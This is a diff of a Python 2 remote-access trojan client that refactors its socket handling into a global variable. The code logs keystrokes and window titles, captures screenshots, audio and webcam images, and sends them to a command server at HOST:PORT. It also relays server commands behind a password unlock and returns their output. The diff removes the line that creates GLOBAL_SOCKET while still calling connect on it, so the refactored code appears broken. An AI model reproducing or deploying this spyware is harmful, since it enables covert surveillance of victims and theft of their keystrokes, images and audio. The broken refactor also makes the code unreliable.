@@ -17,7 +17,6 @@ KEY_LOGS = {}
 SCREENSHOT_LOGS = {}
 AUDIO_LOGS = {}
 
-GLOBAL_SOCKET = None
 CURRENT_WINDOW_TITLE = None
 
 uppercase = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
@@ -166,7 +165,6 @@ def screen_bits():
 
 
 def send_keylog():
-    global GLOBAL_SOCKET
     global ACTIVE
     global CURRENT_WINDOW_TITLE
     global KEY_LOGS
@@ -176,21 +174,20 @@ def send_keylog():
         CURRENT_WINDOW_TITLE = ''
         keys_for_send = str(KEY_LOGS)
         KEY_LOGS = {}
-        data_send(GLOBAL_SOCKET, keys_for_send, 'keyloggerLogs')
+        data_send(keys_for_send, 'keyloggerLogs')
     key_scheduler = sched.scheduler(time.time, time.sleep)
     key_scheduler.enter(config['kt'], 1, send_keylog, ())
     key_scheduler.run()
 
 
 def send_screenshot():
-    global GLOBAL_SOCKET
     global ACTIVE
     global SCREENSHOT_LOGS
 
     config = init()
     if config['sts'] and len(SCREENSHOT_LOGS) > 0 and ACTIVE:
         for i in SCREENSHOT_LOGS.keys():
-            data_send(GLOBAL_SOCKET, str(SCREENSHOT_LOGS[i]), 'screenshotLogs')
+            data_send(str(SCREENSHOT_LOGS[i]), 'screenshotLogs')
         SCREENSHOT_LOGS = {}
     screen_scheduler = sched.scheduler(time.time, time.sleep)
     screen_scheduler.enter(config['st'], 1, send_screenshot, ())
@@ -202,7 +199,7 @@ def send_audio():
     config = init()
     if config['ats'] and len(AUDIO_LOGS) > 0:
         for i in AUDIO_LOGS.keys():
-            data_send(GLOBAL_SOCKET, str(AUDIO_LOGS[i]), 'audioLogs')
+            data_send(str(AUDIO_LOGS[i]), 'audioLogs')
         AUDIO_LOGS = {}
     audio_scheduler = sched.scheduler(time.time, time.sleep)
     audio_scheduler.enter(config['at'], 1, send_audio, ())
@@ -434,17 +431,18 @@ def webcam_shot():
     })
 
 
-def data_receive(sock, end='[ENDOFMESSAGE]'):
+def data_receive(end='[ENDOFMESSAGE]'):
+    global GLOBAL_SOCKET
     received_data = ''
     try:
-        payload = sock.recv(1024)
+        payload = GLOBAL_SOCKET.recv(1024)
         while payload:
             received_data = received_data + payload
             if received_data.endswith(end):
                 received_data = received_data[:-len(end)]
                 break
             else:
-                payload = sock.recv(1024)
+                payload = GLOBAL_SOCKET.recv(1024)
                 continue
         return ast.literal_eval(received_data)
     except socket.error:
@@ -452,9 +450,10 @@ def data_receive(sock, end='[ENDOFMESSAGE]'):
 
 
 # Send Data Function
-def data_send(sock, message, mode, session_id='', end='[ENDOFMESSAGE]'):
+def data_send(message, mode, session_id='', end='[ENDOFMESSAGE]'):
+    global GLOBAL_SOCKET
+    global ACTIVE 
     global ID
-    global ACTIVE
     message = {
         'payload': message,
         'mode': mode,
@@ -463,7 +462,7 @@ def data_send(sock, message, mode, session_id='', end='[ENDOFMESSAGE]'):
         'key': ID,
     }
     try:
-        sock.sendall(str(message)+end)
+        GLOBAL_SOCKET.sendall(str(message)+end)
         ACTIVE = True
     except socket.error:
         return
@@ -528,7 +527,7 @@ def send_info(sock):
 
     while ACTIVE:
         try:
-            data_send(sock, check_info(), 'infoChecker')
+            data_send(check_info(), 'infoChecker')
             time.sleep(5)
         except socket.error:
             ACTIVE = False
@@ -542,29 +541,26 @@ def reactor():
 
     while 1:
         try:
-            server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            server_socket.connect((HOST, PORT))
+            GLOBAL_SOCKET.connect((HOST, PORT))
             ACTIVE = True
         except:
             ACTIVE = False
             time.sleep(5)
             continue
 
-        GLOBAL_SOCKET = server_socket
-
         while ACTIVE:
             try:
 
                 # Begin Init
-                data = data_receive(server_socket)
+                data = data_receive()
                 if data['mode'] == 'connectSuccess':
                     key = get_key()
                     if len(key) != 0:
                         ID = key
-                        data_send(server_socket, key, 'clientInitializing')
+                        data_send(key, 'clientInitializing')
                     else:
-                        data_send(server_socket, 'noKey', 'clientInitializing')
-                        new_key = data_receive(server_socket)
+                        data_send('noKey', 'clientInitializing')
+                        new_key = data_receive()
                         set_key(new_key['payload'])
                         ID = new_key['payload']
 
@@ -574,12 +570,10 @@ def reactor():
                     # After Initialized
                     while ACTIVE:
                         try:
-                            data = data_receive(server_socket)
+                            data = data_receive()
                         except socket.error:
                             break
 
-                        print data['payload']
-                        print data['mode']
                         if len(data['payload']) == 0 and len(data['mode']) == 0:
                             break
 
@@ -588,12 +582,12 @@ def reactor():
                             if pass_key == SECRET:
                                 UNLOCKED = True
 
-                                data_send(server_socket, 'loginSuccess', 'loginSuccess', session_id=data['session_id'])
+                                data_send('loginSuccess', 'loginSuccess', session_id=data['session_id'])
 
                                 while UNLOCKED:
 
                                     try:
-                                        data = data_receive(server_socket)
+                                        data = data_receive()
 
                                         # Lock Client
                                         if data['mode'] == 'lockClient':
@@ -645,10 +639,10 @@ def reactor():
 
                                         # Run Shell
                                         else:
-                                            data_send(server_socket, 'unknownCommandError', 'unknownCommandError', session_id=data['session_id'])
+                                            data_send('unknownCommandError', 'unknownCommandError', session_id=data['session_id'])
                                             continue
 
-                                        data_send(server_socket, output, 'clientMode', session_id=data['session_id'])
+                                        data_send(output, 'clientMode', session_id=data['session_id'])
 
                                     except socket.error:
                                         break
@@ -656,23 +650,23 @@ def reactor():
                                         break
 
                             else:
-                                data_send(server_socket, 'notAuthorized', 'notAuthorized', session_id=data['session_id'])
+                                data_send('notAuthorized', 'notAuthorized', session_id=data['session_id'])
 
                         # Lock Client Functions
                         # Desktop Screenshot
                         elif data['mode'] == 'getScreen':
                             print 'Send Screenshot'
-                            data_send(server_socket, get_screenshot(), 'getScreen', session_id=data['session_id'])
+                            data_send(get_screenshot(), 'getScreen', session_id=data['session_id'])
                             print 'Sent Screenshot'
                             continue
 
                         # Webcamera Shot
                         elif data['mode'] == 'getWebcam':
-                            data_send(server_socket, webcam_shot(), 'getWebcam', session_id=data['session_id'])
+                            data_send(webcam_shot(), 'getWebcam', session_id=data['session_id'])
                             continue
 
                         else:
-                            data_send(server_socket, 'notAuthorized', 'notAuthorized')
+                            data_send('notAuthorized', 'notAuthorized')
                             continue
 
                 else:
